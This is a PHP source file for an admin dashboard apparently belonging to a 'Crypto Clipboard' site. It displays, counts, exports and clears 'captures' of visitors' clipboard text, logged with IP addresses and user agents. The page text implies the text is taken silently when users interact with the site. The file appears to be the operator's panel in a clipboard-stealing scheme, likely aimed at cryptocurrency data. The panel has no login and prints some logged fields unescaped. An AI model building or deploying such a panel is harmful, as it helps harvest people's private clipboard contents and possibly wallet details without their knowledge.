<?php
// Set Indian timezone
date_default_timezone_set('Asia/Kolkata');

$json_file = 'clipboard_data.json';

// Get data from JSON file
$data = [];
if (file_exists($json_file)) {
    $json_content = file_get_contents($json_file);
    $data = json_decode($json_content, true) ?: [];
}

// Clear data if requested
if (isset($_GET['clear']) && $_GET['clear'] == '1') {
    file_put_contents($json_file, '[]');
    $data = [];
    header('Location: admin.php');
    exit;
}

// Get today's count
function get_today_count($data) {
    $today = date('Y-m-d');
    $count = 0;
    foreach ($data as $entry) {
        if (isset($entry['time']) && date('Y-m-d', strtotime($entry['time'])) === $today) {
            $count++;
        }
    }
    return $count;
}

// Get unique IPs count
function get_unique_ips($data) {
    $ips = [];
    foreach ($data as $entry) {
        if (isset($entry['ip'])) {
            $ips[] = $entry['ip'];
        }
    }
    return count(array_unique($ips));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Crypto Clipboard</title>
    <style>
        :root {
            --blue: #3861fb;
            --green: #16c784;
            --red: #ea3943;
            --dark: #1a1a1a;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #0f0f0f 0%, #1a1a1a 100%);
            color: white;
            min-height: 100vh;
        }
        
        .header {
            background: rgba(0,0,0,0.8);
            padding: 20px;
            border-bottom: 1px solid #333;
        }
        
        .navbar {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            font-size: 24px;
            font-weight: bold;
            background: linear-gradient(45deg, #ff0080, #00ff88);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .container {
            max-width: 1200px;
            margin: 30px auto;
            padding: 20px;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(255,255,255,0.05);
            padding: 25px;
            border-radius: 10px;
            border: 1px solid #333;
            text-align: center;
        }
        
        .stat-number {
            font-size: 36px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        
        .total { color: #ff0080; }
        .today { color: #00ff88; }
        .unique { color: #3861fb; }
        
        .controls {
            display: flex;
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .btn {
            padding: 12px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            text-decoration: none;
            display: inline-block;
        }
        
        .btn-primary { background: #3861fb; color: white; }
        .btn-danger { background: #ff0080; color: white; }
        .btn-success { background: #00ff88; color: black; }
        
        .logs {
            background: rgba(0,0,0,0.5);
            border: 1px solid #333;
            border-radius: 10px;
            padding: 20px;
            max-height: 500px;
            overflow-y: auto;
        }
        
        .log-entry {
            background: rgba(255,255,255,0.05);
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 6px;
            border-left: 4px solid #00ff88;
        }
        
        .log-time {
            color: #00ff88;
            font-weight: bold;
        }
        
        .log-text {
            margin: 8px 0;
            word-break: break-all;
        }
        
        .log-meta {
            color: #888;
            font-size: 12px;
        }
        
        .empty {
            text-align: center;
            color: #888;
            padding: 40px;
            font-style: italic;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="navbar">
            <div class="logo">🔐 Admin Dashboard</div>
            <div style="color: #00ff88;">Welcome Admin! 👑</div>
        </div>
    </div>

    <div class="container">
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number total"><?php echo count($data); ?></div>
                <div>Total Captures</div>
            </div>
            <div class="stat-card">
                <div class="stat-number today"><?php echo get_today_count($data); ?></div>
                <div>Today's Captures</div>
            </div>
            <div class="stat-card">
                <div class="stat-number unique"><?php echo get_unique_ips($data); ?></div>
                <div>Unique Users</div>
            </div>
        </div>

        <div class="controls">
            <button class="btn btn-primary" onclick="location.reload()">🔄 Refresh</button>
            <a href="clipboard_data.json" class="btn btn-success" download>📥 Export JSON</a>
            <button class="btn btn-danger" onclick="clearData()">🗑️ Clear All Data</button>
            <a href="index.php" class="btn btn-primary">🌐 View Site</a>
        </div>

        <div class="logs">
            <h3 style="margin-bottom: 15px;">📊 Clipboard Logs (<?php echo count($data); ?> entries)</h3>
            
            <?php if (empty($data)): ?>
                <div class="empty">No clipboard captures yet. Data will appear here when users interact with the site.</div>
            <?php else: ?>
                <?php foreach (array_reverse($data) as $log): ?>
                    <div class="log-entry">
                        <div class="log-time">🕒 <?php echo $log['time'] ?? 'Unknown'; ?></div>
                        <div class="log-text">📋 <?php echo htmlspecialchars($log['text'] ?? 'Empty'); ?></div>
                        <div class="log-meta">
                            🌐 IP: <?php echo $log['ip'] ?? 'Unknown'; ?> | 
                            🖥️ <?php echo substr($log['user_agent'] ?? 'Unknown', 0, 50); ?>
                        </div>
                    </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
    </div>

    <script>
    function clearData() {
        if (confirm('⚠️ Are you sure you want to delete ALL clipboard data?')) {
            window.location.href = 'admin.php?clear=1';
        }
    }
    
    // Auto-refresh every 15 seconds
    setInterval(() => {
        location.reload();
    }, 15000);
    </script>
</body>
</html>
